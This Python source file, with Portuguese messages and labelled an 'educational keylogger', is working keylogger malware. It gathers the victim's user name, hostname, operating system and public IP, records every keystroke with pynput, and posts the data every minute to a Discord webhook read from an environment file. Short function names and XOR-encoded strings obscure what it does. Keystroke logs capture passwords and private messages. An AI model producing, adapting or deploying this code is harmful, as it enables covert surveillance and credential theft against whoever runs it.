import base64
import json
import os
import time
from datetime import datetime
from dotenv import load_dotenv
import random
import string

load_dotenv()


WEBHOOK_URL = os.getenv('WEBHOOK_URL')
if not WEBHOOK_URL:
    print("ERRO: WEBHOOK_URL não encontrado no arquivo .env")
    exit(1)


def _g(s):
    return ''.join(chr(ord(c) ^ 0x42) for c in s)

def _h(s):
    return ''.join(chr(ord(c) ^ 0x42) for c in s)


_dt = _g('🖥️ Keylogger Iniciado')
_kt = _g('📝 Registro de Teclas')
_ft = _g('Keylogger Educacional')

def _gi():
    try:
        requests = __import__('requests')
        return requests.get('https://api.ipify.org').text
    except Exception as e:
        print(f"Erro ao obter IP: {e}")
        return 'Desconhecido'

def _ss():
    try:
        print("Iniciando coleta de informações do sistema...")
        socket = __import__('socket')
        platform = __import__('platform')
        requests = __import__('requests')
        
        u = os.getenv('USER') or os.getenv('USERNAME') or 'Desconhecido'
        h = socket.gethostname()
        s = platform.system() + ' ' + platform.release()
        d = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        i = _gi()
        
        print(f"Informações coletadas: {u} | {h} | {s} | {d} | {i}")
        
        e = {
            "title": _dt,
            "color": 0x2ecc71,
            "fields": [
                {"name": "Usuário", "value": u, "inline": True},
                {"name": "Hostname", "value": h, "inline": True},
                {"name": "SO", "value": s, "inline": True},
                {"name": "Data/Hora", "value": d, "inline": True},
                {"name": "IP", "value": i, "inline": True},
            ],
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": _ft}
        }
        
        print("Enviando informações para o Discord...")
        response = requests.post(WEBHOOK_URL, json={"embeds": [e]})
        print(f"Resposta do Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Erro ao enviar informações do sistema: {e}")

class _K:
    def __init__(self):
        self._b = []
        self._ls = time.time()
        self._si = 60
        self._wk = WEBHOOK_URL
        self._sk = {
            'Key.space': '[SPACE]',
            'Key.enter': '[ENTER]',
            'Key.tab': '[TAB]',
            'Key.backspace': '[BACKSPACE]',
            'Key.shift': '[SHIFT]',
            'Key.shift_r': '[SHIFT]',
            'Key.ctrl_l': '[CTRL]',
            'Key.ctrl_r': '[CTRL]',
            'Key.alt_l': '[ALT]',
            'Key.alt_r': '[ALT]',
            'Key.esc': '[ESC]',
            'Key.caps_lock': '[CAPSLOCK]',
            'Key.cmd': '[CMD]',
            'Key.delete': '[DELETE]',
            'Key.up': '[UP]',
            'Key.down': '[DOWN]',
            'Key.left': '[LEFT]',
            'Key.right': '[RIGHT]',
        }

    def _fk(self, k):
        if k is None:
            return '[NONE]'
        k = str(k)
        if k in self._sk:
            return self._sk[k]
        if k.startswith('Key.'):
            return '[' + k[4:].replace('_', ' ').upper() + ']'
        return k

    def _on_press(self, key):
        try:
            k = key.char
        except AttributeError:
            k = str(key)
        k = self._fk(k)
        self._b.append(k)
        if time.time() - self._ls > self._si:
            self._sd()
            self._ls = time.time()

    def _fb(self):
        r = []
        p = ''
        for k in self._b:
            if len(k) == 1 and (k.isalnum() or k in ',.;:/?<>!@#$%¨&*()-_=+|\\"\'~^[]{}'):
                p += k
            else:
                if p:
                    r.append(p)
                    p = ''
                r.append(k)
        if p:
            r.append(p)
        return ' '.join(r)

    def _sd(self):
        if not self._b:
            return

        try:
            requests = __import__('requests')
            e = {
                "title": _kt,
                "description": "```" + self._fb() + "```",
                "color": 0x3498db,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {
                    "text": _ft
                }
            }
            p = {
                "embeds": [e]
            }
            response = requests.post(self._wk, json=p)
            print(f"Teclas enviadas. Status: {response.status_code}")
            self._b = []
        except Exception as e:
            print(f"Erro ao enviar teclas: {e}")

    def start(self):
        print("Iniciando captura de teclas...")
        pynput = __import__('pynput')
        with pynput.keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

if __name__ == "__main__":
    print("Iniciando keylogger...")
    _k = _K()
    try:
        _ss()
        _k.start()
    except KeyboardInterrupt:
        print("Interrompido pelo usuário")
        requests = __import__('requests')
        requests.post(WEBHOOK_URL, json={"content": "Sistema interrompido pelo usuário"})
    except Exception as e:
        print(f"Erro inesperado: {e}")
        requests = __import__('requests')
        requests.post(WEBHOOK_URL, json={"content": f"Erro inesperado: {str(e)}"})